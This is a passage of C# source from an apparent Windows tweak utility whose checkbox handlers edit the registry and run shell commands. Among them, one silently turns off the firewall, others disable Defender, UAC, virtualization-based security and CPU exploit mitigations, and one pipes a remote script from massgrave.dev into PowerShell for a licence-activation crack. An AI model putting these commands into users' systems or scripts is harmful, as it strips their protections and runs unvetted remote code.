                hcmd($"regedit.exe /s {path_regpack}/maintenance.reg");
                hcmd($"regedit.exe /s {path_regpack}/oldphotoviewer.reg");
                hcmd($"regedit.exe /s {path_regpack}/priority.reg");
                hcmd($"regedit.exe /s {path_regpack}/responsiveness.reg");
                hcmd($"regedit.exe /s {path_regpack}/search.reg");
                hcmd($"regedit.exe /s {path_regpack}/systemrestore.reg");
                supercmd($"regedit.exe /s {path_regpack}/uac.reg");
                hcmd($"regedit.exe /s {path_regpack}/explorer.reg");
                hcmd($"regedit.exe /s {path_regpack}/menushowdelay.reg");
                hcmd($"regedit.exe /s {path_regpack}/3dedit.reg");
                supercmd($"regedit.exe /s {path_regpack}/tweaker.reg");
                hcmd(@"taskkill /f /im OneDrive.exe & %systemroot%\SysWOW64\OneDriveSetup.exe /uninstall");
                hcmd(@"reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Device Metadata"" /v ""PreventDeviceMetadataFromNetwork"" /t REG_DWORD /d 1 /f");
                hcmd(@"reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Device Metadata"" /v ""PreventDeviceMetadataFromNetwork"" /t REG_DWORD /d 1 /f");
                hcmd(@"reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\DriverSearching"" /v ""SearchOrderConfig"" /t REG_DWORD /d 0 /f");
                hcmd(@"reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"" /v ""ExcludeWUDriversInQualityUpdate"" /t REG_DWORD /d 1 /f");
                hcmd("netsh advfirewall set allprofiles state off");
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Mouse", true);
                key.SetValue("EnhancePointerPrecision", "0");
                key.SetValue("MouseSpeed", "0");
                key.SetValue("MouseThreshold1", "0");
                key.SetValue("MouseThreshold2", "0");
                key.Close();
                if (!win10)
                {
                    supercmd($"regedit.exe /s {path_regpack}/win11widgets.bat");
                }
                Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("regpack", 1);
                checkBox_reg.Enabled = false;
                checkBox_reg.Checked = false;
                back_main_1.Visible = true;

            }
            if (checkBox_dism.Checked)
            {
                hcmd(@"Dism /Online /Set-ReservedStorageState /State:Disabled");
                Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("ReservedStorageState", 1);
                checkBox_dism.Enabled = false;
                checkBox_dism.Checked = false;
                back_main_2.Visible = true;
            }
            if (checkBox_gibernate.Checked)
            {
                hcmd("powercfg -h off");
                Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("hibernate", 1);
                checkBox_gibernate.Enabled = false;
                checkBox_gibernate.Checked = false;
                back_main_3.Visible = true;

            }
            if (checkBox_scheme.Checked)
            {
                hcmd("powercfg -restoredefaultschemes");
                File.WriteAllBytes(path_scheme, Resources.scheme);
                string guidstring = Guid.NewGuid().ToString("D");
                hcmd($"powercfg -restoredefaultschemes");
                hcmd($"powercfg /import {path_scheme} {guidstring}");
                hcmd($"powercfg /s {guidstring}");
                //Process powercfg = Process.Start("powercfg.cpl");
                //powercfg.WaitForExit();
                Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("imported_powerscheme", 1);
                checkBox_scheme.Enabled = false;
                checkBox_scheme.Checked = false;
                back_main_4.Visible = true;
            }
            if (checkBox_mpo.Checked)
            {
                Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\Dwm", true).SetValue("OverlayTestMode", 5);
                checkBox_mpo.Enabled = false;
                checkBox_mpo.Checked = false;
                back_main_6.Visible = true;
            }
            if (checkBox_usb.Checked)
            {
                File.WriteAllText(tempfolder + @"\usbpowersaving.bat", Resources.usbpowersaving);
                hcmd($"regedit.exe /s {tempfolder}/usbpowersaving.cmd");
                Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("usbpowersaving", 1);
                checkBox_usb.Enabled = false;
                checkBox_usb.Checked = false;
                back_main_7.Visible = true;
            }
            if (checkBox_bcdedit.Checked)
            {
                hcmd("bcdedit /set tscsyncpolicy enhanced");
                hcmd("bcdedit /set bootux disabled");
                hcmd("bcdedit /set bootmenupolicy standard");
                hcmd("bcdedit /set quietboot yes");
                hcmd("bcdedit /set allowedinmemorysettings 0x0");
                hcmd("bcdedit /set vsmlaunchtype Off");
                hcmd("bcdedit /set vm No");
                hcmd("reg add \"HKLM\\Software\\Policies\\Microsoft\\FVE\" /v \"DisableExternalDMAUnderLock\" /t Reg_DWORD /d \"0\" /f");
                hcmd("reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows\\DeviceGuard\" /v \"EnableVirtualizationBasedSecurity\" /t Reg_DWORD /d \"0\" /f");
                hcmd("\treg add \"HKLM\\Software\\Policies\\Microsoft\\Windows\\DeviceGuard\" /v \"HVCIMATRequired\" /t Reg_DWORD /d \"0\" /f");
                hcmd("bcdedit /set x2apicpolicy Enable");
                hcmd("bcdedit /set uselegacyapicmode No");
                hcmd("bcdedit /set configaccesspolicy Default");
                hcmd("bcdedit /set usephysicaldestination No");
                hcmd("bcdedit /set usefirmwarepcisettings No ");
                Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("bcdedit", 1);
                checkBox_bcdedit.Enabled = false;
                checkBox_bcdedit.Checked = false;
                back_main_8.Visible = true;
            }
            if (checkBox_mtiititit.Checked)
            {
                Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management", true)?.SetValue("FeatureSettings", 1);
                Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management", true)?.SetValue("FeatureSettingsOverride", 3);
                Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management", true)?.SetValue("FeatureSettingsOverrideMask", 3);
                Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management", true)?.SetValue("EnableCfg", 0);
                Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\Kernel", true)?.SetValue("ProtectionMode", 0);
                Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\kernel", true)?.SetValue("DisableExceptionChainValidation", 1);
                Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity", true)?.SetValue("Enabled", 0);
                //supercmd("ren %SYSTEMROOT%\\System32\\mcupdate_GenuineIntel.dll mcupdate_GenuineIntel.old");
                //supercmd("ren %SYSTEMROOT%\\System32\\mcupdate_AuthenticAMD.dll mcupdate_AuthenticAMD.old");
                Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("Mitigations", 1);
                checkBox_mtiititit.Enabled = false;
                checkBox_mtiititit.Checked = false;
                back_main_9.Visible = true;

            }
            if (checkBox_mmagent.Checked)
            {
                File.WriteAllText(tempfolder + @"\prefetcher hdd.reg", Resources.prefetcher_hdd);
                File.WriteAllText(tempfolder + @"\prefetcher ssd.reg", Resources.prefetcher_ssd);
                //

                using (WebClient wc = new WebClient())
                    if (!File.Exists($"{tempfolder}\\DefenderKiller.zip"))
                    {
                        wc.DownloadFile("https://raw.githubusercontent.com/oixro/WOTBO/main/resources/smartctl.exe", $"{tempfolder}\\smartctl.exe");
                    }


                Process getramGB = Process.Start(new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = "/command (Get-WmiObject Win32_PhysicalMemory).capacity | Measure-Object -Sum | Foreach {[int]($_.Sum/1GB)}",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                });
                string ramGB = ((getramGB.StandardOutput.ReadToEnd())).Trim();


                string systemdisk = Environment.GetEnvironmentVariable("windir").Replace(@"\Windows", "");
                //MessageBox.Show(systemdisk);
                Process checkssd = Process.Start(new ProcessStartInfo
                {
                    FileName = $"{smartctl}",
                    Arguments = $"-i {systemdisk}",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                });
                string ssd = ((checkssd.StandardOutput.ReadToEnd())).ToLower();
                //MessageBox.Show(ssd);
                bool isdiskssd = false;
                if (ssd.Contains("solid state device"))
                    isdiskssd = true;
                if ((ssd.Contains("ssd")))
                    isdiskssd = true;
                if ((ssd.Contains("nvme")))
                    isdiskssd = true;
                if (isdiskssd)
                {
                    hcmd($"regedit.exe /s {tempfolder}/prefetcher ssd.reg");
                }
                else
                {
                    hcmd($"regedit.exe /s {tempfolder}/prefetcher hdd.reg");
                }
                int ramgbINT = Convert.ToInt32(ramGB) * 32;
                if (ramgbINT <= 128)
                {
                    mmMemory = 128;
                }
                else if (ramgbINT >= 1024)
                {
                    mmMemory = 1024;
                }
                else
                {
                    mmMemory = ramgbINT;
                }
                if (win10 == false)
                {
                    powershell($"enable-mmagent -ApplicationPreLaunch");
                    powershell($"enable-mmagent -MC");
                    powershell($"disable-mmagent -PC");
                    powershell($"set-mmagent -moaf {mmMemory}");
                }
                else
                {
                    powershell($"enable-mmagent -ApplicationPreLaunch");
                    powershell($"disable-mmagent -MC");
                    powershell($"disable-mmagent -PC");
                    powershell($"set-mmagent -moaf {mmMemory}");
                }

                Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("mmagent", 1);
                checkBox_mmagent.Enabled = false;
                checkBox_mmagent.Checked = false;
                back_main_10.Visible = true;
            }
            if (checkBox_page.Checked)
            {
                hcmd($"regedit.exe /s {path_regpack}\\pagefile.reg");
                Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("pagefile", 1);
                checkBox_page.Enabled = false;
                checkBox_page.Checked = false;
                back_main_11.Visible = true;
            }
            if (checkBox_mousefix.Checked)
            {
                File.WriteAllText(tempfolder + @"\mousefix.reg", Resources.mousefix);
                DialogResult result = MessageBox.Show("Mousefix корректно будет работать только при масштабе Windows 100%.\nВы уверены что у вас установлен корректный масштаб?",
                    "Windows optimization tool by oixro (WOTBO)", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                if (result == DialogResult.Yes)
                {
                    hcmd($"regedit.exe /s {tempfolder}\\mousefix.reg");
                    Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("mousefix", 1);
                    checkBox_mousefix.Enabled = false;
                    checkBox_mousefix.Checked = false;
                    back_main_5.Visible = true;
                }
                else
                {
                    checkBox_mousefix.Checked = false;
                }
            }
            #endregion
            #region gpu
            if (checkBox_ansel.Checked)
            {
                string[] ansel = Directory.GetFiles(@"C:\Windows\System32\DriverStore\", "NvCameraEnable.exe", SearchOption.AllDirectories);
                if (ansel.Length > 0)
                {
                    string anselPath = ansel[0];
                    hcmd($"{anselPath} off");
                }
                else
                {
                    MessageBox.Show("Файл NvCameraEnable.exe не найден");
                }

                checkBox_ansel.Checked = false;
                checkBox_ansel.Enabled = false;
                back_gpu_4.Visible = true;
            }
            if (checkBox_hdcp.Checked)
            {
                checkBox_hdcp.Checked = false;
                checkBox_hdcp.Enabled = false;
                Registry.LocalMachine.OpenSubKey(@"System\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000", true).SetValue("RMHdcpKeyglobZero", 1);
                back_gpu_2.Visible = true;

            }
            if (checkBox_dopNVIDIA_tweaks.Checked)
            {
                Registry.CurrentUser.CreateSubKey(@"Software\NVIDIA Corporation\Global\NVTweak\Devices\509901423-0\Color", true)?.SetValue("NvCplUseColorCorrection", "0");
                Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\GraphicsDrivers", true)?.SetValue("PlatformSupportMiracast", "0");
                Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\nvlddmkm\Global\NVTweak", true)?.SetValue("DisplayPowerSaving", "0");
                Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000", true)?.SetValue("EnableTiledDisplay", "0");
                Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\nvlddmkm\FTS", true)?.SetValue("EnableRID61684", "1");
                checkBox_dopNVIDIA_tweaks.Checked = false;
                checkBox_dopNVIDIA_tweaks.Enabled = false;
                back_gpu_3.Visible = true;
            }
            if (checkBox_directplay.Checked)
            {
                hcmd("dism /online /Enable-Feature /FeatureName:DirectPlay /All");
                checkBox_directplay.Checked = false;
                checkBox_directplay.Enabled = false;
                back_gpu_1.Visible = true;
            }
            #endregion
            #region ui
            if (checkBoxUI_Buttons_1.Checked)
            {
                Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop\\WindowMetrics", true).SetValue("CaptionHeight", "-270");
                Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop\\WindowMetrics", true).SetValue("CaptionWidth", "-270");
                Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("buttons", 1);
                checkBoxUI_Buttons_1.Enabled = false;
                checkBoxUI_Buttons_1.Checked = false;
                back_ui_1.Visible = true;
            }
            if (checkBoxUI_Buttons_2.Checked)
            {
                hcmd($"regedit.exe /s {path_ui}/things.reg");
                hcmd(@"rd /s /q ""%userprofile%\3D Objects\""");
                if (!win10)
                    hcmd(@"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"" /v ""UseCompactMode"" /t REG_DWORD /d ""00000001"" /f");
                supercmd($"regedit.exe /s {path_regpack}/Explorer/foldernetworkX.reg");
                hcmd("taskkill /f /im explorer.exe & timeout /t 1 && explorer.exe");
                Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("litle_explorer_things", 1);
                checkBoxUI_Buttons_2.Enabled = false;
                checkBoxUI_Buttons_2.Checked = false;
                back_ui_2.Visible = true;
            }
            if (checkBoxUI_Buttons_3.Checked)
            {

                Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("contex", 1);
                checkBoxUI_Buttons_3.Enabled = false;
                checkBoxUI_Buttons_3.Checked = false;
                back_ui_3.Visible = true;
            }
            if (checkBoxUI_Buttons_4.Checked)
            {
                Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true).SetValue("JPEGImportQuality", 100);
                checkBoxUI_Buttons_4.Enabled = false;
                checkBoxUI_Buttons_4.Checked = false;
                back_ui_4.Visible = true;
            }
            if (checkBox_bluefolders.Checked)
            {
                if (win10)
                {
                    File.WriteAllText(tempfolder + @"\blueiconsw10.bat", Resources.blueiconsw10);
                    using (WebClient wc = new WebClient())
                        if (!File.Exists($"{tempfolder}\\imageres.zip"))
                        {
                            wc.DownloadFile("https://raw.githubusercontent.com/oixro/WOTBO/main/resources/imageres.zip", $"{tempfolder}\\imageres.zip");
                            ZipFile.ExtractToDirectory($"{tempfolder}\\imageres.zip", tempfolder);
                        }
                    hcmd($"{tempfolder}\\blueiconsw10.bat");
                    checkBox_bluefolders.Checked = false;
                    checkBox_bluefolders.Enabled = false;
                    back_ui_5.Visible = true;
                    Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("bluefolders", 1);
                }
                else
                {
                    File.WriteAllText(tempfolder + @"\blueicons.bat", Resources.blueicons);
                    using (WebClient wc = new WebClient())
                        if (!File.Exists($"{tempfolder}\\BlueIcon_Minimal.zip"))
                        {
                            wc.DownloadFile("https://raw.githubusercontent.com/oixro/WOTBO/main/resources/BlueIcon_Minimal.zip", $"{tempfolder}\\BlueIcon_Minimal.zip");
                            ZipFile.ExtractToDirectory($"{tempfolder}\\BlueIcon_Minimal.zip", tempfolder + "\\BlueIcon Minimal");
                        }
                    hcmd($"{tempfolder}\\blueicons.bat");
                    checkBox_bluefolders.Checked = false;
                    checkBox_bluefolders.Enabled = false;
                    back_ui_5.Visible = true;
                    Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("bluefolders", 1);
                }
            }
            if (checkBox_contex.Checked)
            {
                if (!win10)
                {
                    //hcmd($"regedit.exe /s {tempfolder}\\win11contextmenu.reg");
                    Registry.CurrentUser.CreateSubKey(@"Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32", true).SetValue("", " ");
                    hcmd(@"taskkill /f /im explorer.exe & timeout /t 1 && explorer.exe");
                    checkBox_contex.Checked = false;
                    checkBox_contex.Enabled = false;
                    back_ui_6.Visible = true;
                    await Task.Delay(3000);
                }
            }
            if (checkBox_shapka.Checked)
            {
                //hcmd($"{tempfolder}\\shapka.bat");
                hcmd("taskkill /f /im explorer.exe >nul 2>&1");
                supercmd("reg add \"HKCR\\CLSID\\{6480100b-5a83-4d1e-9f69-8ae5a88e9a33}\\InProcServer32\" /v \"\" /t REG_SZ /d \"C:\\Windows\\System32\\FixByVlado\" /f");
                await Task.Delay(1000);
                hcmd("explorer.exe");
                checkBox_shapka.Checked = false;
                checkBox_shapka.Enabled = false;
                back_ui_7.Visible = true;
            }
            if (checkBox_wotboincontex.Checked)
            {
                if (!File.Exists(@"C:\Windows\gear.ico"))
                {
                    File.WriteAllBytes(tempfolder + @"\gear.zip", Resources.gear);
                    ZipFile.ExtractToDirectory(tempfolder + @"\gear.zip", "C:\\Windows");
                }
                RegistryKey key = Registry.ClassesRoot.CreateSubKey(@"DesktopBackground\Shell\WOTBO", true);
                key.SetValue("", "WOTBO");
                key.SetValue("icon", @"C:\Windows\gear.ico");//вставить ico
                key.CreateSubKey("command");
                key.Close();
                if (!File.Exists(@"C:\Windows\wotbo.exe"))
                {
                    File.Copy(exepath, @"C:\Windows\wotbo.exe");
                }
                Registry.ClassesRoot.CreateSubKey(@"DesktopBackground\Shell\WOTBO\command", true).SetValue("", contexpath);
                checkBox_wotboincontex.Checked = false;
                checkBox_wotboincontex.Enabled = false;
                back_ui_8.Visible = true;
            }
            if (checkBox_explorer.Checked)
            {
                RegistryKey key = Registry.ClassesRoot.CreateSubKey(@"DesktopBackground\Shell\explorer", true);
                key.SetValue("", "Restart explorer.exe");
                if (win10)
                    key.SetValue("icon", "imageres.dll,264");
                else
                    key.SetValue("icon", "imageres.dll,265");

                key.CreateSubKey("command");
                key.Close();
                Registry.ClassesRoot.CreateSubKey(@"DesktopBackground\Shell\explorer\command", true).SetValue("", @"c:\Windows\system32\explorer.bat");
                checkBox_explorer.Checked = false;
                checkBox_explorer.Enabled = false;
                back_ui_9.Visible = true;
            }
            if (checkBox_ffmpeg.Checked)
            {

                using (WebClient wc = new WebClient())
                    if (!File.Exists($"{tempfolder}\\ffmpeg.zip"))
                    {
                        wc.DownloadFile("https://github.com/GyanD/codexffmpeg/releases/download/7.0/ffmpeg-7.0-essentials_build.zip", $"{tempfolder}\\ffmpeg.zip");
                        wc.DownloadFile("https://raw.githubusercontent.com/oixro/WOTBO/main/resources/ffmpeg.reg", $"{tempfolder}\\ffmpeg.reg");
                        ZipFile.ExtractToDirectory($"{tempfolder}\\ffmpeg.zip", tempfolder);
                    }
                if (File.Exists(@"C:\Windows\ffmpeg.exe"))
                {
                    hcmd("taskkill /f /im ffmpeg.exe");
                    File.Delete(@"C:\Windows\ffmpeg.exe");
                }
                File.Copy($@"{tempfolder}\ffmpeg-7.0-essentials_build\bin\ffmpeg.exe", @"C:\Windows\ffmpeg.exe");
                hcmd($@"regedit.exe /s {tempfolder}/ffmpeg.reg");

                checkBox_ffmpeg.Enabled = false;
                checkBox_ffmpeg.Checked = false;
                back_ui_10.Visible = true;
            }
            if (checkBox_mica.Checked)
            {
                //https://raw.githubusercontent.com/oixro/WOTBO/main/resources/Release_x64.zip
                using (WebClient wc = new WebClient())
                    if (!File.Exists($"{tempfolder}\\Release_x64.zip"))
                    {
                        wc.DownloadFile("https://raw.githubusercontent.com/oixro/WOTBO/main/resources/Release_x64.zip", $"{tempfolder}\\Release_x64.zip");
                        ZipFile.ExtractToDirectory($"{tempfolder}\\Release_x64.zip", tempfolder);
                    }
                File.Copy($@"{tempfolder}\Release\ExplorerBlurMica.dll", @"C:\Windows\ExplorerBlurMica.dll");
                File.Copy($@"{tempfolder}\Release\config.ini", @"C:\Windows\config.ini");
                hcmd($"regsvr32 /s C:\\Windows\\ExplorerBlurMica.dll & taskkill /f /im explorer.exe & explorer.exe & timeout /t 1 & explorer.exe");
                checkBox_mica.Enabled = false;
                checkBox_mica.Checked = false;
                back_ui_11.Visible = true;
            }
            if (checkBox_cursors.Checked)
            {
                using (WebClient wc = new WebClient())
                    if (!File.Exists($"{tempfolder}\\cursors.zip"))
                    {
                        wc.DownloadFile("https://raw.githubusercontent.com/oixro/WOTBO/main/resources/cursors.zip", $"{tempfolder}\\cursors.zip");
                        ZipFile.ExtractToDirectory($"{tempfolder}\\cursors.zip", tempfolder);
                    }
                if (MessageBox.Show($"Установить светлый или тёмный курсор?\nДа - светлый\nНет - тёмный", "WOTBO", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                {
                    InstallCursor($@"{tempfolder}\cursors\light\small\base\Install.inf");
                }
                else
                {
                    InstallCursor($@"{tempfolder}\cursors\dark\small\base\Install.inf");
                }
                checkBox_cursors.Checked = false;
                checkBox_cursors.Enabled = false;
                back_ui_12.Visible = true;
            }
            #endregion
            #region dop
            if (checkBox_activate.Checked)
            {

                powershell(@"irm https://massgrave.dev/get | iex");
                checkBox_activate.Checked = false;
                //MessageBox.Show("Ожидайте открытия активатора");
            }
            if (checkBox_killdefender.Checked)
            {
                if (MessageBox.Show("DefenderKiller полностью удалит защитник.\nВосстановить его не получится!\nЗапустить DefenderKiller?", "",
                    MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
                {
                    checkBox_killdefender.Checked = false;
                    using (WebClient wc = new WebClient())
                        if (!File.Exists($"{tempfolder}\\DefenderKiller.zip"))
                        {
                            wc.DownloadFile("https://raw.githubusercontent.com/oixro/WOTBO/main/resources/DefenderKiller.zip", $"{tempfolder}\\DefenderKiller.zip");
                            ZipFile.ExtractToDirectory(tempfolder + @"\DefenderKiller.zip", path_dfkiller);
                        }
                        else
                        {
                            File.Delete(tempfolder + @"\DefenderKiller.zip");
                            Process.Start($@"{path_dfkiller}\DefenderKiller.bat").WaitForExit();
                        }
                    Process.Start($@"{path_dfkiller}\DefenderKiller.bat").WaitForExit();
                    checkBox_disabledefender.Visible = false;
                    back_main_12.Visible = false;
                }
                else
                {
                    checkBox_killdefender.Checked = false;
                }
            }
            if (checkBox_edgedelete.Checked)
            {
                DialogResult result = MessageBox.Show("Edge будет удалён, оставить WebView? ", "", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);
                if (result == DialogResult.No)
                {
                    //MessageBox.Show("Ожидайте открытия программы");
                    using (WebClient wc = new WebClient())
                        wc.DownloadFile("https://github.com/ShadowWhisperer/Remove-MS-Edge/blob/main/Remove-Edge.exe?raw=true", $"{tempfolder}\\Remove-Edge.exe");
                    Process.Start($"{tempfolder}\\Remove-Edge.exe").WaitForExit();
                    checkBox_edgedelete.Checked = false;

                }
                if (result == DialogResult.Yes)
                {
                    //MessageBox.Show("Ожидайте открытия программы");
                    using (WebClient wc = new WebClient())
                        wc.DownloadFile("https://github.com/ShadowWhisperer/Remove-MS-Edge/blob/main/Remove-EdgeOnly.exe?raw=true", $"{tempfolder}\\Remove-EdgeOnly.exe");
                    Process.Start($"{tempfolder}\\Remove-EdgeOnly.exe").WaitForExit();
                    checkBox_edgedelete.Checked = false;
                }
                if (result == DialogResult.Cancel)
                {
                    checkBox_edgedelete.Checked = false;
                }

            }
            if (checkBox_onedrive.Checked)
            {
                hcmd(@"TASKKILL /f /im OneDrive.exe && %SystemRoot%\SysWOW64\OneDriveSetup.exe /uninstall & timeout /t 1 && rd %userprofile%\OneDrive");
                supercmd(@"reg delete HKCR\CLSID\{018D5C66-4533-4307-9B53-224DE2ED1FE6} /f &
reg delete HKCR\Wow6432Node\CLSID\{018D5C66-4533-4307-9B53-224DE2ED1FE6} /f &
rd /s /q %userprofile%\OneDrive &
rd /s /q %userprofile%\AppData\Local\Microsoft\OneDrive &
rd /s /q ""%allusersprofile%\Microsoft OneDrive""");
                checkBox_onedrive.Checked = false;
                checkBox_onedrive.Enabled = false;
            }
            if (checkBox_compactos.Checked)
            {
                scmd(@"compact /CompactOS:always");
                checkBox_compactos.Checked = false;
            }
            if (checkBox_WinSxS.Checked)
            {
                scmd(@"Dism.exe /online /Cleanup-Image /StartComponentCleanup /ResetBase");
                checkBox_WinSxS.Checked = false;
            }
            if (checkBox_temp.Checked)
            {
                hcmd(@"rd /q /s %temp%\ >nul");
                hcmd(@"del /q /f /s %temp%*.* >nul");
                checkBox_temp.Checked = false;
            }
            if (checkBox_updclean.Checked)
            {
                //hcmd($"{tempfolder}\\cleanupdate.bat");
                hcmd(@"net stop wuauserv >nul");
                hcmd(@"del /q /f /s %windir%\SoftwareDistribution\Download\*.* >nul");
                hcmd(@"rd /q /s %windir%\SoftwareDistribution\Download\ >nul");
                hcmd(@"del /q /f /s %windir%\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Windows\DeliveryOptimization\Cache\ >nul");
                hcmd(@"rd /q /s %windir%\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Windows\DeliveryOptimization\Cache\ >nul");
                checkBox_updclean.Checked = false;
            }
            if (checkBox_picture_cache.Checked)
            {
                Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", true).SetValue("Max Cached Icons", 4096);
                checkBox_picture_cache.Checked = false;
                checkBox_picture_cache.Enabled = false;
                back_dop_1.Visible = true;
            }
            if (checkBox_mobile_traffic.Checked)
            {
                Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", true).SetValue("DefaultTTL", 0x00000041);
                Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters", true).SetValue("DefaultTTL", 0x00000041);
                checkBox_mobile_traffic.Checked = false;
                checkBox_mobile_traffic.Enabled = false;
                back_dop_2.Visible = true;
            }
            if (checkBox_nastroyka.Checked)
            {
                Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\UserProfileEngagement", true)?.SetValue("ScoobeSystemSettingEnabled", 0);
                checkBox_nastroyka.Checked = false;
                checkBox_nastroyka.Enabled = false;
                back_dop_3.Visible = true;
            }
            if (checkBox_zalipanie.Checked)
            {
                Registry.CurrentUser.OpenSubKey(@"Control Panel\Accessibility\StickyKeys", true)?.SetValue("Flags", "506");
                checkBox_zalipanie.Checked = false;
                checkBox_zalipanie.Enabled = false;
                back_dop_4.Visible = true;
            }
            #endregion
            #region pro
            if (checkBox_pro_1.Checked)
            {
                {  //HomeDelete
                    hcmd(@"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"" /v ""HubMode"" /t REG_DWORD /d ""00000001"" /f >nul 2>&1");
                    supercmd(@"cmd.exe /c reg add ""HKCR\CLSID\{f874310e-b6b7-47dc-bc84-b9e6b38f5903}"" /v ""System.IsPinnedToNameSpaceTree"" /t REG_DWORD /d ""00000000"" /f");
                    //GaleryDelete
                    hcmd("reg add \"HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{e88865ea-0e1c-4e20-9aa6-edcd0212c87c}\" /v \"System.IsPinnedToNameSpaceTree\" /t REG_DWORD /d \"00000000\" /f >nul 2>&1");
                    supercmd(@"cmd.exe /c reg add ""HKEY_CURRENT_USER\Software\Classes\CLSID\{e88865ea-0e1c-4e20-9aa6-edcd0212c87c}"" /v ""System.IsPinnedToNameSpaceTree"" /t REG_DWORD /d ""00000001"" /f >nul 2>&1");
                    //restart explorer
                    hcmd("taskkill /f /im explorer.exe && timeout /t 1 && explorer.exe");
                    Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("pro_1", 1);
                    checkBox_pro_1.Checked = false;
                    checkBox_pro_1.Enabled = false;
                }
            } //disable main & gallery folder in explorer.exe
            if (checkBox_pro_2.Checked)
            {
                back_pro_2.Visible = true;
                do
                {
                    hcmd($"taskkill /f /im BackgroundMonitoringServices.exe >nul 2>&1");
                }
                while (Process.GetProcessesByName("BackgroundMonitoringServices").Length > 0);
                Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("block_backgr", 1);
                Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).DeleteValue("BackgroundMonitoringServices");
                checkBox_pro_2.Checked = false;
                checkBox_pro_2.Enabled = false;
                File.Delete(@"C:\Windows\System32\drivers\BackgroundMonitoringServices.exe");
            } //#oixro
            if (checkBox_pro_3.Checked)
            {
                hcmd($"regedit /s {tempfolder}\\updates.reg");
                checkBox_pro_3.Checked = false;
                checkBox_pro_3.Enabled = false;
                back_pro_3.Visible = true;
            } //winupdates
            if (checkBox_pro_4.Checked)
            {
                Form3 inspector = new Form3();
                inspector.ShowDialog();
                checkBox_pro_4.Checked = false;
            } //inspector
            if (checkBox_pro_6.Checked)
            {
                checkBox_pro_6.Checked = false;
                Form4 msimode = new Form4();
                Process.Start($"{tempfolder}\\MSI_util_v3.exe");
                msimode.ShowDialog();
            } //msi mode
            if (checkBox_pro_7.Checked)
            {
                hcmd($"{tempfolder}\\affinity.bat");
                checkBox_pro_7.Checked = false;
                checkBox_pro_7.Enabled = false;
                Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("pro_7", 1);
            } //affinity
            if (checkBox_pro_8.Checked)
            {
